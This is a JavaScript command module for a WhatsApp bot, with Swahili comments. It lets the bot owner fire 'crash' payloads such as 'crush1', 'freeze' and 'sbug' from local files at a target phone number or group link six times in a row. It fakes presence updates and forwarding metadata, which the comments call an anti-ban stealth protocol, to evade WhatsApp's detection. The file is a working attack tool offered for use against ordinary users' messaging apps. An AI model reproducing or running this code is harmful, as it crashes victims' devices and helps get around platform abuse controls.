const fs = require('fs-extra');
const path = require('path');
const config = require('../../config');
const { fancy } = require('../../lib/font');

module.exports = {
    name: "strike",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;

        // 1. Kuchukua maelekezo (Type na Target)
        // Mfano: .strike crush1 255712345678
        let type = args[0]?.toLowerCase(); 
        let target = args[1];

        if (!type || !target) {
            return msg.reply(fancy(`╭── • 🥀 • ──╮\n  ꜱᴛʀɪᴋᴇ ᴍᴀɴᴜᴀʟ\n╰── • 🥀 • ──╯\n\nᴜꜱᴀɢᴇ: .ꜱᴛʀɪᴋᴇ [ᴛʏᴘᴇ] [ɴᴜᴍʙᴇʀ/ʟɪɴᴋ]\n\nᴀᴠᴀɪʟᴀʙʟᴇ ᴛʏᴘᴇꜱ:\n- crush1, crush2\n- freeze, sios\n- sbug, sbug2\n- skill, slugs`));
        }

        let jid = target.includes("chat.whatsapp.com") ? target : target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        
        // 2. Kutambua Extension (Baadhi ni .txt, baadhi ni .text)
        let filePath = path.join(__dirname, `../../lib/payload/${type}.txt`);
        if (!fs.existsSync(filePath)) {
            filePath = path.join(__dirname, `../../lib/payload/${type}.text`);
        }

        if (!fs.existsSync(filePath)) {
            return msg.reply(fancy(`🥀 ᴇʀʀᴏʀ: ᴘᴀʏʟᴏᴀᴅ '${type}' ɴᴏᴛ ꜰᴏᴜɴᴅ.`));
        }

        // 3. Soma kodi za kishindo
        const lethalPayload = fs.readFileSync(filePath, 'utf-8');

        msg.reply(fancy(`🥀 ɪɴɪᴛɪᴀᴛɪɴɢ ${type.toUpperCase()} ꜱᴛʀɪᴋᴇ ᴏɴ ᴛᴀʀɢᴇᴛ...`));

        // --- THE "STANYTZ" STEALTH PROTOCOL (Anti-Ban) ---
        for (let i = 0; i < 6; i++) { // Mapigo 6 ya kishindo (Strong enough to crash)
            
            // A. Fake Presence (Kudanganya WA Server)
            await conn.sendPresenceUpdate('recording', jid);
            await new Promise(r => setTimeout(r, 2000)); // Delay ya kitalamu (2 sec)

            // B. Invisible Strike via AdReply
            await conn.sendMessage(jid, { 
                text: lethalPayload,
                contextInfo: { 
                    externalAdReply: { 
                        title: "🥀 INSIDIOUS V2.1.1 🥀", 
                        body: "SYSTEM RE-ENCRYPTION IN PROGRESS", 
                        mediaType: 1, 
                        renderLargerThumbnail: false,
                        thumbnailUrl: "https://files.catbox.moe/horror.jpg",
                        sourceUrl: config.channelLink 
                    },
                    isForwarded: true,
                    forwardingScore: 999,
                    forwardedNewsletterMessageInfo: { 
                        newsletterJid: config.newsletterJid, 
                        newsletterName: `ꜱᴛʀɪᴋᴇ ᴅᴇᴘʟᴏʏᴇᴅ: ${type.toUpperCase()}` 
                    }
                } 
            });
        }
        msg.reply(fancy(`🥀 ${type.toUpperCase()} ꜱᴇǫᴜᴇɴᴄᴇ ꜰɪɴɪꜱʜᴇᴅ. ᴛᴀʀɢᴇᴛ ɪꜱ ɴᴏᴡ ɪɴ ᴛʜᴇ ꜰᴜʀᴛʜᴇʀ.`));
    }
};
